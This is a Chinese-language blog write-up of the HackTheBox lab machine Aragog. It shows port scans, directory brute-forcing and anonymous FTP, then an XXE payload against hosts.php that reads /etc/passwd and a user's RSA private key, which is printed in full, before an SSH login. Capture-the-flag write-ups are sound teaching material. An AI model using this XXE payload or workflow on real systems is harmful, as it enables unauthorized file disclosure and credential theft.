@@ -1,0 +1,697 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:123456789101112131415161718192021Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 202">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Aragog">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Aragog/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:123456789101112131415161718192021Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78[sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 202">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/Aragog.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829100634427.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.869Z">
+<meta property="article:modified_time" content="2022-08-29T03:05:39.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/Aragog.png">
+  
+  
+  
+  <title>HackTheBox-Aragog - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Aragog"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          144 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Aragog</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://www.worldisend.com/img/Aragog.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="Aragog"></p>
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.78<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 01:50:39 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.10.78                                     <br>Discovered open port 21/tcp on 10.10.10.78                                     <br>Discovered open port 22/tcp on 10.10.10.78    <br>Crazy:~$ sudo nmap -sC -sV 10.10.11.78 -p80,21,22 -Pn <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 09:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.78<br>Host is up.<br><br>PORT   STATE    SERVICE VERSION<br>21/tcp filtered ftp<br>22/tcp filtered ssh<br>80/tcp filtered http<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.56 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.78 -p80,21,22 -Pn<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ feroxbuster -u http://10.10.10.78/ -e<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.10.78/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET       15l       74w     3338c http://10.10.10.78/icons/ubuntu-logo.png<br>200      GET      375l      968w    11321c http://10.10.10.78/<br>403      GET       11l       32w      292c http://10.10.10.78/icons/<br>200      GET      166l      644w     5108c http://10.10.10.78/icons/README<br>403      GET       11l       32w      299c http://10.10.10.78/server-status<br>301      GET        9l       28w      316c http://10.10.10.78/icons/small =&gt; http://10.10.10.78/icons/small/<br></code></pre></td></tr></table></figure>
+
+<p>FTP里有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; user<br>(username) anonymous<br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||42091|)<br>150 Here comes the directory listing.<br>-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt<br>226 Directory send OK.<br>ftp&gt; get test.txt<br><span class="hljs-built_in">local</span>: test.txt remote: test.txt<br>229 Entering Extended Passive Mode (|||49152|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> test.txt (86 bytes).<br>100% |****************************************************************************************************|    86        1.94 KiB/s    00:00 ETA<br>226 Transfer complete.<br>86 bytes received <span class="hljs-keyword">in</span> 00:00 (0.61 KiB/s)<br>ftp&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> test.txt                   <br>&lt;details&gt;<br>    &lt;subnet_mask&gt;255.255.255.192&lt;/subnet_mask&gt;<br>    &lt;<span class="hljs-built_in">test</span>&gt;&lt;/test&gt;<br>&lt;/details&gt;<br></code></pre></td></tr></table></figure>
+
+<p>共享与FTP似乎是没有关联的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.10.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100<br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.10.78<br>[+] Method:                  GET<br>[+] Threads:                 100<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Extensions:              txt,php,html<br>[+] Timeout:                 10s<br>===============================================================<br>2022/08/29 10:03:55 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 11321]<br>/hosts.php            (Status: 200) [Size: 46]   <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220829100634427.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829100634427"></p>
+<h3 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt"></a>User.txt</h3><p>计算可能主机的。抓个包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hosts.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.78<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
+
+<p>XML。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X POST -d @test.txt http://10.10.10.78/hosts.php<br><br>There are 62 possible hosts <span class="hljs-keyword">for</span> 255.255.255.192<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> test.xml                                          <br>&lt;!DOCTYPE foo[<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/lsb-release&quot;</span>&gt; ]&gt;<br>&lt;details&gt;<br>    &lt;subnet_mask&gt;&amp;xxe;&lt;/subnet_mask&gt;<br>    &lt;<span class="hljs-built_in">test</span>&gt;&lt;/test&gt;<br>&lt;/details&gt;<br><br>Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php<br><br>There are 4294967294 possible hosts <span class="hljs-keyword">for</span> DISTRIB_ID=Ubuntu<br>DISTRIB_RELEASE=16.04<br>DISTRIB_CODENAME=xenial<br>DISTRIB_DESCRIPTION=<span class="hljs-string">&quot;Ubuntu 16.04.3 LTS&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php<br><br>There are 4294967294 possible hosts <span class="hljs-keyword">for</span> root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br>syslog:x:104:108::/home/syslog:/bin/false<br>_apt:x:105:65534::/nonexistent:/bin/false<br>messagebus:x:106:110::/var/run/dbus:/bin/false<br>uuidd:x:107:111::/run/uuidd:/bin/false<br>lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false<br>whoopsie:x:109:117::/nonexistent:/bin/false<br>avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false<br>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false<br>dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false<br>colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false<br>speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false<br>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br>kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br>pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br>rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false<br>saned:x:119:127::/var/lib/saned:/bin/false<br>usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false<br>florian:x:1000:1000:florian,,,:/home/florian:/bin/bash<br>cliff:x:1001:1001::/home/cliff:/bin/bash<br>mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false<br>sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin<br>ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false<br></code></pre></td></tr></table></figure>
+
+<p>可以读取到florian用户的ssh秘钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -X POST -d @test.xml http://10.10.10.78/hosts.php<br><br>There are 4294967294 possible hosts <span class="hljs-keyword">for</span> <br>-----BEGIN RSA PRIVATE KEY-----<br>MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d<br>+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8<br>lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn<br>1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+<br>Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd<br>d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK<br>AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg<br>TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD<br>9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb<br>/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV<br>0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1<br>sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV<br>Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH<br>zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE<br>rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE<br>tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3<br>HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/<br>I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg<br>ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7<br>HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y<br>kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs<br>4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+<br>7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3<br>daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv<br>uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ ssh -i id_rsa florian@10.10.10.78                               <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.78 (10.10.10.78)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:4bLLuCjTjPPZfGo5hd3YV/aaiWwIv3OCTqDYKlk1pgo.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.78<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Last login: Fri Jan 12 13:56:45 2018 from 10.10.14.3</span><br><span class="hljs-string">florian@aragog:~$ ls</span><br><span class="hljs-string">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  examples.desktop  user.txt</span><br><span class="hljs-string">florian@aragog:~$ cat user.txt </span><br><span class="hljs-string">f43.............................</span><br></code></pre></td></tr></table></figure>
+
+<p>在用户目录能够看到.mysql_history，而且是有数据库服务的：</p>
